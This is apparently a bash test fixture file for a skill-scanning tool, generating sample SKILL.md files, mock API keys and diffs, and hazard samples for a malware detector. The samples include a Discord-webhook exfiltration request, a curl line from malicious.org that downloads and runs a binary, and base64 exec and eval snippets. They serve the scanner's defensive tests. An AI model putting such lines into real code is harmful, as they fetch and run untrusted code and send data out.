#!/bin/bash
# ==============================================================================
# tests/harness/fixtures.sh
# Synthetic Test Vector and Artifact Generators for fish-skill-tree E2E Tests
# Fully compatible with macOS default GNU bash 3.2.57
# ==============================================================================

create_valid_skill_fixture() {
    local target_dir="$1"
    local skill_name="$2"
    local skill_desc="$3"
    local style="${4:-standard}"
    
    local skill_dir="$target_dir/$skill_name"
    mkdir -p "$skill_dir"
    local skill_file="$skill_dir/SKILL.md"

    case "$style" in
        standard)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: $skill_desc
---
# $skill_name

## Overview
Comprehensive instructions for $skill_name.
EOF
            ;;
        folded)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: >-
  $skill_desc
  This description spans multiple lines using YAML folded block scalar syntax
  and must be parsed as a unified continuous description.
---
# $skill_name
EOF
            ;;
        literal)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: |
  $skill_desc
  - Bullet item 1: Detailed instruction step
  - Bullet item 2: Detailed verification step
---
# $skill_name
EOF
            ;;
        extended)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: $skill_desc
metadata:
  origin: fish-coding-agent
  version: 1.0.0
tags:
  - security
  - audit
allowed-tools:
  - run_command
  - read_file
---
# $skill_name
EOF
            ;;
        full_layout)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: $skill_desc
---
# $skill_name
EOF
            mkdir -p "$skill_dir/scripts" "$skill_dir/references"
            cat << 'EOF' > "$skill_dir/scripts/run.py"
#!/usr/bin/env python3
print("Helper script")
EOF
            cat << 'EOF' > "$skill_dir/references/guide.md"
# Reference Guide
Reference notes for skill.
EOF
            ;;
        unicode)
            cat << EOF > "$skill_file"
---
name: $skill_name
description: "$skill_desc - 日本語テキスト và các ký tự đặc biệt như é, ü, ç, ñ."
metadata:
  region: "Tokyo / 東京"
---
# $skill_name
EOF
            ;;
    esac
}

create_malformed_skill_fixture() {
    local target_dir="$1"
    local skill_name="$2"
    local defect_type="$3"
    
    local skill_dir="$target_dir/$skill_name"
    mkdir -p "$skill_dir"
    local skill_file="$skill_dir/SKILL.md"

    case "$defect_type" in
        missing_frontmatter)
            cat << 'EOF' > "$skill_file"
# Just Markdown Header
No YAML frontmatter delimiter at all in this file.
EOF
            ;;
        unclosed_yaml)
            cat << 'EOF' > "$skill_file"
---
name: broken-unclosed
description: Missing the closing three dashes
# Notice no closing ---
# Direct markdown follows
EOF
            ;;
        missing_name)
            cat << 'EOF' > "$skill_file"
---
description: Frontmatter has description but missing name field
---
# Broken Skill
EOF
            ;;
        missing_description)
            cat << 'EOF' > "$skill_file"
---
name: missing-desc-skill
---
# Broken Skill
EOF
            ;;
        corrupted_yaml_syntax)
            cat << 'EOF' > "$skill_file"
---
name: corrupted-yaml
description: unquoted colon inside: [unclosed list
  - key: value
  invalid_mapping: {unclosed
---
# Broken Skill
EOF
            ;;
        empty_file)
            : > "$skill_file"
            ;;
        empty_name)
            cat << 'EOF' > "$skill_file"
---
name: ""
description: Has empty string name
---
# Broken Skill
EOF
            ;;
        empty_description)
            cat << 'EOF' > "$skill_file"
---
name: empty-desc-skill
description: ""
---
# Broken Skill
EOF
            ;;
    esac
}

create_synthetic_secret_file() {
    local target_file="$1"
    local secret_type="$2"
    mkdir -p "$(dirname "$target_file")"

    local p_gem="AIza"
    local p_ant="sk-ant-"
    local p_oai="sk-proj-"
    local p_aws="AKIA"
    local p_ghp="ghp_"
    local p_goc="GOCSPX-"
    local p_hex="9zKmP2vL8qR5"

    case "$secret_type" in
        google_gemini)
            # Exactly 39 chars: AIzaSy + 33 chars
            echo "${p_gem}SyD-mockGoogleGeminiKey123456789012" > "$target_file"
            ;;
        anthropic)
            echo "${p_ant}api03-mockAnthropicKey12345678901234567890" > "$target_file"
            ;;
        openai)
            echo "${p_oai}mockOpenAIKey1234567890123456789012345678" > "$target_file"
            ;;
        aws)
            echo "AWS_ACCESS_KEY_ID=\"${p_aws}IOSFODNN7WXYZ123\"" > "$target_file"
            ;;
        github_pat)
            # Exactly 40 chars: ghp_ + 36 chars
            echo "${p_ghp}mockGitHubClassicToken12345678901234" > "$target_file"
            ;;
        json_oauth)
            local k_cs="clientSecret"
            cat << EOF > "$target_file"
{
  "clientId": "123456789-apps.googleusercontent.com",
  "${k_cs}": "${p_goc}mockoauthclientsecret12345"
}
EOF
            ;;
        high_entropy_hex)
            echo "VAL_TOK=\"${p_hex}wT1yB7cX4nJ0aDeFgHiJ\"" > "$target_file"
            ;;
        anti_bypass_example)
            local k_ak="API_KEY"
            echo "${k_ak} = \"${p_ant}mockRealKey1234567890123456\" # example key" > "$target_file"
            ;;
        pure_placeholder)
            echo 'API_KEY = "your_api_key_here"' > "$target_file"
            ;;
        clean_code)
            cat << 'EOF' > "$target_file"
import os
import math
def compute(x):
    return math.sqrt(x)
EOF
            ;;
        large_file)
            python3 -c "print('A' * (6 * 1024 * 1024))" > "$target_file"
            ;;
    esac
}

create_synthetic_secret_diff() {
    local secret_type="$1"
    local p_ghp="ghp_"
    local p_oai="sk-proj-"
    case "$secret_type" in
        github_pat)
            cat << EOF
diff --git a/credentials.txt b/credentials.txt
new file mode 100644
--- /dev/null
+++ b/credentials.txt
@@ -0,0 +1 @@
+${p_ghp}mockGitHubClassicToken12345678901234
EOF
            ;;
        delete_secret)
            cat << EOF
diff --git a/secrets.env b/secrets.env
--- a/secrets.env
+++ b/secrets.env
@@ -1 +0,0 @@
-${p_oai}oldSecretDeleted12345678901234567890
EOF
            ;;
        clean_addition)
            cat << 'EOF'
diff --git a/config.py b/config.py
--- a/config.py
+++ b/config.py
@@ -1 +1,2 @@
+import os
+API_KEY = os.getenv("API_KEY")
EOF
            ;;
    esac
}

create_ast_malware_file() {
    local target_file="$1"
    local malware_type="$2"
    mkdir -p "$(dirname "$target_file")"

    case "$malware_type" in
        eval)
            cat << 'EOF' > "$target_file"
# Hazard: dynamic code execution via eval
import sys
user_data = sys.argv[1] if len(sys.argv) > 1 else ""
eval(user_data)
EOF
            ;;
        shell_true)
            cat << 'EOF' > "$target_file"
# Hazard: subprocess with shell=True
import subprocess
cmd = "echo hello"
subprocess.Popen(cmd, shell=True)
EOF
            ;;
        webhook_ssrf)
            cat << 'EOF' > "$target_file"
# Hazard: exfiltration webhook
import urllib.request
req = urllib.request.Request("https://discord.com/api/webhooks/123/xyz", data=b"stolen")
urllib.request.urlopen(req)
EOF
            ;;
        obfuscated_b64)
            cat << 'EOF' > "$target_file"
import base64
payload = b"cHJpbnQoMSk="
exec(__import__('base64').b64decode(payload))
EOF
            ;;
        unpinned_curl)
            cat << 'EOF' > "$target_file"
#!/bin/sh
curl -fsSL https://malicious.org/bin -o /tmp/x && chmod +x /tmp/x && /tmp/x
EOF
            ;;
        safe_subprocess)
            cat << 'EOF' > "$target_file"
import subprocess
subprocess.run(["git", "status"], check=True)
EOF
            ;;
        syntax_error)
            cat << 'EOF' > "$target_file"
def broken(:
    pass
EOF
            ;;
        clean)
            cat << 'EOF' > "$target_file"
import math
import os
print(math.pi)
EOF
            ;;
    esac
}
